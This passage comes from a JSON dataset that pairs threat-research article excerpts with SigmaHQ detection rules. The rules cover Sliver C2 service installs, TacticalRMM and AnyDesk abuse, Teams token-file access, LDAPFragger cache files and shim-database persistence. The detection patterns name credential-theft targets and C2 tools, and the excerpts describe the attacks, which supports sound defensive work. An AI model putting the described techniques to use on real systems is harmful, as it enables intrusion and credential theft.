          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection_service_1": {
          "ImagePath|re": "^[a-zA-Z]:\\\\windows\\\\temp\\\\[a-zA-Z0-9]{10}\\.exe"
        },
        "selection_service_2": {
          "ServiceName": [
            "Sliver",
            "Sliver implant"
          ]
        },
        "condition": "selection_eid and 1 of selection_service_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_install_sliver.yml"
  },
  "826": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/",
    "markdown": "# Looking for the ‘Sliver’ lining: Hunting for emerging command-and-control frameworks **August 24, 2022** ## Introduction Microsoft has observed the Sliver command-and-control (C2) framework now being adopted and integrated in intrusion campaigns by nation-state threat actors, cybercrime groups directly supporting ransomware and extortion, and other threat actors to evade detection. We’ve seen these actors use Sliver with—or as a replacement for—Cobalt Strike. Given Cobalt Strike’s popularity as an attack tool, defenses against it have also improved over time. Sliver thus presents an attractive alternative for actors looking for a lesser-known toolset with a low barrier for entry. First made public",
    "sigma_rule": {
      "title": "Sliver C2 Default Service Installation",
      "id": "31c51af6-e7aa-4da7-84d4-8f32cc580af2",
      "status": "test",
      "description": "Detects known malicious service installation that appear in cases in which a Sliver implants execute the PsExec commands",
      "references": [
        "https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/client/command/commands.go#L1231",
        "https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-25",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_eid": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection_service_1": {
          "ImagePath|re": "^[a-zA-Z]:\\\\windows\\\\temp\\\\[a-zA-Z0-9]{10}\\.exe"
        },
        "selection_service_2": {
          "ServiceName": [
            "Sliver",
            "Sliver implant"
          ]
        },
        "condition": "selection_eid and 1 of selection_service_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_install_sliver.yml"
  },
  "827": {
    "url": "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/",
    "markdown": "# Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware **Categories:** adfind cobaltstrike ransomware **Published on:** November 28, 2022 --- In June of 2022, we observed a threat actor gaining access to an environment via Emotet and operating over an eight-day period. During this time, multiple rounds of enumeration and lateral movement occurred using Cobalt Strike. Remote access tools were used for command and control, such as Tactical RMM and Anydesk. The threat actors' final actions included data exfiltration using Rclone and domain-wide deployment of Quantum Ransomware. We have observed similar traits in previous cases where Emotet and",
    "sigma_rule": {
      "title": "TacticalRMM Service Installation",
      "id": "4bb79b62-ef12-4861-981d-2aab43fab642",
      "status": "test",
      "description": "Detects a TacticalRMM service installation. Tactical RMM is a remote monitoring & management tool.",
      "references": [
        "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-28",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_root": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection_service": [
          {
            "ImagePath|contains": "tacticalrmm.exe"
          },
          {
            "ServiceName|contains": "TacticalRMM Agent Service"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use of the tool"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_install_tacticalrmm.yml"
  },
  "828": {
    "url": "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/",
    "markdown": "# Guidance for investigating attacks using CVE-2022-21894: The BlackLotus campaign **April 11, 2023** --- This guide provides steps that organizations can take to assess whether users have been targeted or compromised by threat actors exploiting CVE-2022-21894 via a Unified Extensible Firmware Interface (UEFI) bootkit called BlackLotus. UEFI bootkits are particularly dangerous as they run at computer startup, prior to the operating system loading, and therefore can interfere with or deactivate various operating system (OS) security mechanisms such as BitLocker, hypervisor-protected code integrity (HVCI), and Microsoft Defender Antivirus. Though this could impede investigations and threat hunting efforts, several artifacts can still",
    "sigma_rule": {
      "title": "Windows Service Terminated With Error",
      "id": "acfa2210-0d71-4eeb-b477-afab494d596c",
      "related": [
        {
          "id": "d6b5520d-3934-48b4-928c-2aa3f92d6963",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects Windows services that got terminated for whatever reason",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-14",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7023
        },
        "condition": "selection"
      },
      "falsepositives": [
        "False positives could occur since service termination could happen due to multiple reasons"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_terminated_error_generic.yml"
  },
  "829": {
    "url": "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/",
    "markdown": "# Guidance for investigating attacks using CVE-2022-21894: The BlackLotus campaign **April 11, 2023** --- This guide provides steps that organizations can take to assess whether users have been targeted or compromised by threat actors exploiting CVE-2022-21894 via a Unified Extensible Firmware Interface (UEFI) bootkit called BlackLotus. UEFI bootkits are particularly dangerous as they run at computer startup, prior to the operating system loading, and therefore can interfere with or deactivate various operating system (OS) security mechanisms such as BitLocker, hypervisor-protected code integrity (HVCI), and Microsoft Defender Antivirus. Though this could impede investigations and threat hunting efforts, several artifacts can still",
    "sigma_rule": {
      "title": "Important Windows Service Terminated With Error",
      "id": "d6b5520d-3934-48b4-928c-2aa3f92d6963",
      "related": [
        {
          "id": "acfa2210-0d71-4eeb-b477-afab494d596c",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects important or interesting Windows services that got terminated for whatever reason",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-14",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_eid": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7023
        },
        "selection_name": [
          {
            "param1|contains": [
              " Antivirus",
              " Firewall",
              "Application Guard",
              "BitLocker Drive Encryption Service",
              "Encrypting File System",
              "Microsoft Defender",
              "Threat Protection",
              "Windows Event Log"
            ]
          },
          {
            "Binary|contains": [
              "770069006e0064006500660065006e006400",
              "4500760065006e0074004c006f006700",
              "6d0070007300730076006300",
              "530065006e0073006500",
              "450046005300",
              "420044004500530056004300"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Rare false positives could occur since service termination could happen due to multiple reasons"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_terminated_error_important.yml"
  },
  "830": {
    "url": "https://web.archive.org/web/20230925072707/https://www.randori.com/blog/vulnerability-analysis-queuejumper-cve-2023-21554/",
    "markdown": "## What is QueueJumper (CVE-2023-21554)? On April 11, 2023, Microsoft released a patch for an unauthenticated remote code execution (RCE) vulnerability in the Message Queuing (MSMQ) service, an optional Windows component. The vulnerability was assigned CVE-2023-21554. The issue was nicknamed QueueJumper by Check Point Research, one of the credited discoverers. MSMQ can be installed on a wide range of Windows operating systems, including server and desktop variants. At the time of this writing, no public information was released that provides specific details about the flaw. ## Key takeaways - The vulnerability appears to be exploitable remotely without authentication. - Randori",
    "sigma_rule": {
      "title": "Important Windows Service Terminated Unexpectedly",
      "id": "56abae0c-6212-4b97-adc0-0b559bb950c3",
      "status": "test",
      "description": "Detects important or interesting Windows services that got terminated unexpectedly.",
      "references": [
        "https://web.archive.org/web/20230925072707/https://www.randori.com/blog/vulnerability-analysis-queuejumper-cve-2023-21554/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-14",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_eid": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7034
        },
        "selection_name": [
          {
            "param1|contains": "Message Queuing"
          },
          {
            "Binary|contains": [
              "4d0053004d005100",
              "6d0073006d007100"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Rare false positives could occur since service termination could happen due to multiple reasons"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_terminated_unexpectedly.yml"
  },
  "831": {
    "url": "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
    "markdown": "# Microsoft Teams stores auth tokens as cleartext in Windows, Linux, Macs September 14, 2022 Security analysts have found a severe security vulnerability in the desktop app for Microsoft Teams that gives threat actors access to authentication tokens and accounts with multi-factor authentication (MFA) turned on. Microsoft Teams is a communication platform, included in the 365 product family, used by more than 270 million people for exchanging text messages, videoconferencing, and storing files. The newly discovered security issue impacts versions of the application for Windows, Linux, and Mac and refers to Microsoft Teams storing user authentication tokens in clear text",
    "sigma_rule": {
      "title": "Microsoft Teams Sensitive File Access By Uncommon Applications",
      "id": "65744385-8541-44a6-8630-ffc824d7d4cc",
      "status": "experimental",
      "description": "Detects file access attempts to sensitive Microsoft teams files (leveldb, cookies) by an uncommon process.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
        "https://www.vectra.ai/blog/undermining-microsoft-teams-security-by-mining-tokens"
      ],
      "author": "@SerkinValery",
      "date": "2024-07-22",
      "tags": [
        "attack.credential-access",
        "attack.t1528"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_access",
        "definition": "Requirements: Microsoft-Windows-Kernel-File ETW provider"
      },
      "detection": {
        "selection": {
          "FileName|contains": [
            "\\Microsoft\\Teams\\Cookies",
            "\\Microsoft\\Teams\\Local Storage\\leveldb"
          ]
        },
        "filter_main_legit_location": {
          "Image|endswith": "\\Microsoft\\Teams\\current\\Teams.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_access\\file_access_win_teams_sensitive_files.yml"
  },
  "832": {
    "url": "https://www.vectra.ai/blog/undermining-microsoft-teams-security-by-mining-tokens",
    "markdown": "# Undermining Microsoft Teams Security by Mining Tokens **September 13, 2022** ## Overview In August 2022, the Vectra team identified a post-exploitation opportunity allowing malicious actors with sufficient local or remote file system access to steal valid user credentials from Microsoft Teams due to their plaintext storage on disk. This plaintext credential management was determined to impact all commercial and GCC Desktop Teams clients for Windows, Mac, and Linux. While credential harvesting from memory is a common post-exploitation step, we believe that lowering the bar necessary to harvest creds down to just simple read access to the file system expands",
    "sigma_rule": {
      "title": "Microsoft Teams Sensitive File Access By Uncommon Applications",
      "id": "65744385-8541-44a6-8630-ffc824d7d4cc",
      "status": "experimental",
      "description": "Detects file access attempts to sensitive Microsoft teams files (leveldb, cookies) by an uncommon process.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
        "https://www.vectra.ai/blog/undermining-microsoft-teams-security-by-mining-tokens"
      ],
      "author": "@SerkinValery",
      "date": "2024-07-22",
      "tags": [
        "attack.credential-access",
        "attack.t1528"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_access",
        "definition": "Requirements: Microsoft-Windows-Kernel-File ETW provider"
      },
      "detection": {
        "selection": {
          "FileName|contains": [
            "\\Microsoft\\Teams\\Cookies",
            "\\Microsoft\\Teams\\Local Storage\\leveldb"
          ]
        },
        "filter_main_legit_location": {
          "Image|endswith": "\\Microsoft\\Teams\\current\\Teams.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_access\\file_access_win_teams_sensitive_files.yml"
  },
  "833": {
    "url": "https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961",
    "markdown": "# Detecting LDAPFragger — A newly released Cobalt Strike Beacon using LDAP for C2 communication (blueteamers approach) **Mar 24, 2020** ## Goals: - trying to understand how the tool works - trying to find further detections as blueteamer for a newly released tool - find an efficient detection rule which can be implemented in large scale environment quickly ## After LDAPFragger (introduction blogpost) has been at Github (03–19–2020) I immediately took some views into its capabilities and design. When a new tool for red-teamers has been released, our job as blueteamer is to get up, understand it, test it in",
    "sigma_rule": {
      "title": "ADSI-Cache File Creation By Uncommon Tool",
      "id": "75bf09fa-1dd7-4d18-9af9-dd9e492562eb",
      "status": "test",
      "description": "Detects the creation of an \"Active Directory Schema Cache File\" (.sch) file by an uncommon tool.",
      "references": [
        "https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961",
        "https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/",
        "https://github.com/fox-it/LDAPFragger"
      ],
      "author": "xknow @xknow_infosec, Tim Shelton",
      "date": "2019-03-24",
      "modified": "2023-10-18",
      "tags": [
        "attack.t1001.003",
        "attack.command-and-control"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\Local\\Microsoft\\Windows\\SchCache\\",
          "TargetFilename|endswith": ".sch"
        },
        "filter_main_generic": [
          {
            "Image|endswith": [
              ":\\Program Files\\Cylance\\Desktop\\CylanceSvc.exe",
              ":\\Windows\\CCM\\CcmExec.exe",
              ":\\windows\\system32\\dllhost.exe",
              ":\\Windows\\system32\\dsac.exe",
              ":\\Windows\\system32\\efsui.exe",
              ":\\windows\\system32\\mmc.exe",
              ":\\windows\\system32\\svchost.exe",
              ":\\Windows\\System32\\wbem\\WmiPrvSE.exe",
              ":\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
            ]
          },
          {
            "Image|contains": [
              ":\\Windows\\ccmsetup\\autoupgrade\\ccmsetup",
              ":\\Program Files\\SentinelOne\\Sentinel Agent"
            ]
          }
        ],
        "filter_main_office": {
          "Image|contains|all": [
            ":\\Program Files\\",
            "\\Microsoft Office"
          ],
          "Image|endswith": "\\OUTLOOK.EXE"
        },
        "filter_optional_ldapwhoami": {
          "Image|endswith": "\\LANDesk\\LDCLient\\ldapwhoami.exe"
        },
        "filter_optional_citrix": {
          "Image|endswith": ":\\Program Files\\Citrix\\Receiver StoreFront\\Services\\DefaultDomainServices\\Citrix.DeliveryServices.DomainServices.ServiceHost.exe"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Other legimate tools, which do ADSI (LDAP) operations, e.g. any remoting activity by MMC, Powershell, Windows etc."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_adsi_cache_creation_by_uncommon_tool.yml"
  },
  "834": {
    "url": "https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/",
    "markdown": "# LDAPFragger: Command and Control over LDAP attributes ## Introduction A while back during a penetration test of an internal network, we encountered physically segmented networks. These networks contained workstations joined to the same Active Directory domain, however only one network segment could connect to the internet. To control workstations in both segments remotely with Cobalt Strike, we built a tool that uses the shared Active Directory component to build a communication channel. For this, it uses the LDAP protocol which is commonly used to manage Active Directory, effectively routing beacon data over LDAP. This blogpost will go into detail",
    "sigma_rule": {
      "title": "ADSI-Cache File Creation By Uncommon Tool",
      "id": "75bf09fa-1dd7-4d18-9af9-dd9e492562eb",
      "status": "test",
      "description": "Detects the creation of an \"Active Directory Schema Cache File\" (.sch) file by an uncommon tool.",
      "references": [
        "https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961",
        "https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/",
        "https://github.com/fox-it/LDAPFragger"
      ],
      "author": "xknow @xknow_infosec, Tim Shelton",
      "date": "2019-03-24",
      "modified": "2023-10-18",
      "tags": [
        "attack.t1001.003",
        "attack.command-and-control"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\Local\\Microsoft\\Windows\\SchCache\\",
          "TargetFilename|endswith": ".sch"
        },
        "filter_main_generic": [
          {
            "Image|endswith": [
              ":\\Program Files\\Cylance\\Desktop\\CylanceSvc.exe",
              ":\\Windows\\CCM\\CcmExec.exe",
              ":\\windows\\system32\\dllhost.exe",
              ":\\Windows\\system32\\dsac.exe",
              ":\\Windows\\system32\\efsui.exe",
              ":\\windows\\system32\\mmc.exe",
              ":\\windows\\system32\\svchost.exe",
              ":\\Windows\\System32\\wbem\\WmiPrvSE.exe",
              ":\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
            ]
          },
          {
            "Image|contains": [
              ":\\Windows\\ccmsetup\\autoupgrade\\ccmsetup",
              ":\\Program Files\\SentinelOne\\Sentinel Agent"
            ]
          }
        ],
        "filter_main_office": {
          "Image|contains|all": [
            ":\\Program Files\\",
            "\\Microsoft Office"
          ],
          "Image|endswith": "\\OUTLOOK.EXE"
        },
        "filter_optional_ldapwhoami": {
          "Image|endswith": "\\LANDesk\\LDCLient\\ldapwhoami.exe"
        },
        "filter_optional_citrix": {
          "Image|endswith": ":\\Program Files\\Citrix\\Receiver StoreFront\\Services\\DefaultDomainServices\\Citrix.DeliveryServices.DomainServices.ServiceHost.exe"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Other legimate tools, which do ADSI (LDAP) operations, e.g. any remoting activity by MMC, Powershell, Windows etc."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_adsi_cache_creation_by_uncommon_tool.yml"
  },
  "835": {
    "url": "https://github.com/fox-it/LDAPFragger",
    "markdown": "# LDAPFragger LDAPFragger is a Command and Control tool that enables attackers to route Cobalt Strike beacon data over LDAP using user attributes. For background information, read the release blog: http://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes ## Dependencies and installation - Compiled with `.NET 4.0`, but may work with older and newer .NET frameworks as well ## Usage ``` _ _ __ | | | | / _| | | __| | __ _ _ __ | |_ _ __ __ _ __ _ __ _ ___ _ __ | |/ _` |/ _` | '_ \\| _| '__/ _` |/ _` |/ _` |/",
    "sigma_rule": {
      "title": "ADSI-Cache File Creation By Uncommon Tool",
      "id": "75bf09fa-1dd7-4d18-9af9-dd9e492562eb",
      "status": "test",
      "description": "Detects the creation of an \"Active Directory Schema Cache File\" (.sch) file by an uncommon tool.",
      "references": [
        "https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961",
        "https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/",
        "https://github.com/fox-it/LDAPFragger"
      ],
      "author": "xknow @xknow_infosec, Tim Shelton",
      "date": "2019-03-24",
      "modified": "2023-10-18",
      "tags": [
        "attack.t1001.003",
        "attack.command-and-control"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\Local\\Microsoft\\Windows\\SchCache\\",
          "TargetFilename|endswith": ".sch"
        },
        "filter_main_generic": [
          {
            "Image|endswith": [
              ":\\Program Files\\Cylance\\Desktop\\CylanceSvc.exe",
              ":\\Windows\\CCM\\CcmExec.exe",
              ":\\windows\\system32\\dllhost.exe",
              ":\\Windows\\system32\\dsac.exe",
              ":\\Windows\\system32\\efsui.exe",
              ":\\windows\\system32\\mmc.exe",
              ":\\windows\\system32\\svchost.exe",
              ":\\Windows\\System32\\wbem\\WmiPrvSE.exe",
              ":\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
            ]
          },
          {
            "Image|contains": [
              ":\\Windows\\ccmsetup\\autoupgrade\\ccmsetup",
              ":\\Program Files\\SentinelOne\\Sentinel Agent"
            ]
          }
        ],
        "filter_main_office": {
          "Image|contains|all": [
            ":\\Program Files\\",
            "\\Microsoft Office"
          ],
          "Image|endswith": "\\OUTLOOK.EXE"
        },
        "filter_optional_ldapwhoami": {
          "Image|endswith": "\\LANDesk\\LDCLient\\ldapwhoami.exe"
        },
        "filter_optional_citrix": {
          "Image|endswith": ":\\Program Files\\Citrix\\Receiver StoreFront\\Services\\DefaultDomainServices\\Citrix.DeliveryServices.DomainServices.ServiceHost.exe"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Other legimate tools, which do ADSI (LDAP) operations, e.g. any remoting activity by MMC, Powershell, Windows etc."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_adsi_cache_creation_by_uncommon_tool.yml"
  },
  "836": {
    "url": "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
    "markdown": "# Remote access tool or trojan? How to detect misbehaving RATs The only difference between a remote administration tool and a remote access trojan (RAT) is who’s controlling it. Originally published: August 19, 2021. Last modified: October 1, 2024. --- Red Canary’s Cyber Incident Response Team frequently observes adversaries abusing legitimate remote access utilities for lateral movement and execution of payloads. These tools perform reliably, as you may expect with most enterprise software, and allow operators to pivot and transfer data to and from victim machines. Adversarial abuse of remote monitoring & management (RMM) software is not new, but—given the",
    "sigma_rule": {
      "title": "Suspicious Binary Writes Via AnyDesk",
      "id": "2d367498-5112-4ae5-a06a-96e7bc33a211",
      "status": "test",
      "description": "Detects AnyDesk writing binary files to disk other than \"gcapi.dll\".\nAccording to RedCanary research it is highly abnormal for AnyDesk to write executable files to disk besides gcapi.dll,\nwhich is a legitimate DLL that is part of the Google Chrome web browser used to interact with the Google Cloud API. (See reference section for more details)\n",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-28",
      "modified": "2025-02-24",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\AnyDesk.exe",
            "\\AnyDeskMSI.exe"
          ],
          "TargetFilename|endswith": [
            ".dll",
            ".exe"
          ]
        },
        "filter_dlls": {
          "TargetFilename|endswith": "\\gcapi.dll"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_anydesk_writing_susp_binaries.yml"
  },
  "837": {
    "url": "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/",
    "markdown": "# Confluence Exploit Leads to LockBit Ransomware **Categories:** exploit, lockbit, ransomware **Published on:** February 24, 2025 ## Key Takeaways - The intrusion began with the exploitation of CVE-2023-22527 on an exposed Windows Confluence server, ultimately leading to the deployment of LockBit ransomware across the environment. - The threat actor leveraged various tools, including Mimikatz, Metasploit, and AnyDesk. - The threat actor leveraged RDP for lateral movement, deploying LockBit ransomware through multiple methods, including copying files over SMB shares for remote execution and automated distribution via PDQ Deploy. - Sensitive data was exfiltrated using Rclone, transferring files to MEGA.io cloud storage.",
    "sigma_rule": {
      "title": "Suspicious Binary Writes Via AnyDesk",
      "id": "2d367498-5112-4ae5-a06a-96e7bc33a211",
      "status": "test",
      "description": "Detects AnyDesk writing binary files to disk other than \"gcapi.dll\".\nAccording to RedCanary research it is highly abnormal for AnyDesk to write executable files to disk besides gcapi.dll,\nwhich is a legitimate DLL that is part of the Google Chrome web browser used to interact with the Google Cloud API. (See reference section for more details)\n",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-28",
      "modified": "2025-02-24",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\AnyDesk.exe",
            "\\AnyDeskMSI.exe"
          ],
          "TargetFilename|endswith": [
            ".dll",
            ".exe"
          ]
        },
        "filter_dlls": {
          "TargetFilename|endswith": "\\gcapi.dll"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_anydesk_writing_susp_binaries.yml"
  },
  "838": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory",
    "markdown": "# T1546.011 - Application Shimming ## Description from ATT&CK Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or",
    "sigma_rule": {
      "title": "New Custom Shim Database Created",
      "id": "ee63c85c-6d51-4d12-ad09-04e25877a947",
      "status": "test",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.\nThe Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory",
        "https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence",
        "https://liberty-shell.com/sec/2020/02/25/shim-persistence/",
        "https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-29",
      "modified": "2023-12-06",
      "tags": [
        "attack.persistence",
        "attack.t1547.009"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": [
            ":\\Windows\\apppatch\\Custom\\",
            ":\\Windows\\apppatch\\CustomSDB\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate custom SHIM installations will also trigger this rule"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_creation_new_shim_database.yml"
  },
  "839": {
    "url": "https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence",
    "markdown": "# To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence **May 3, 2017** In 2017, Mandiant responded to multiple incidents we attribute to FIN7, a financially motivated threat group associated with malicious operations dating back to 2015. Throughout the various environments, FIN7 leveraged the CARBANAK backdoor, which this group has used in previous operations. A unique aspect of the incidents was how the group installed the CARBANAK backdoor for persistent access. Mandiant identified that the group leveraged an application shim database to achieve persistence on systems in multiple environments. The shim injected a malicious in-memory patch into",
    "sigma_rule": {
      "title": "New Custom Shim Database Created",
      "id": "ee63c85c-6d51-4d12-ad09-04e25877a947",
      "status": "test",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.\nThe Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory",
        "https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence",
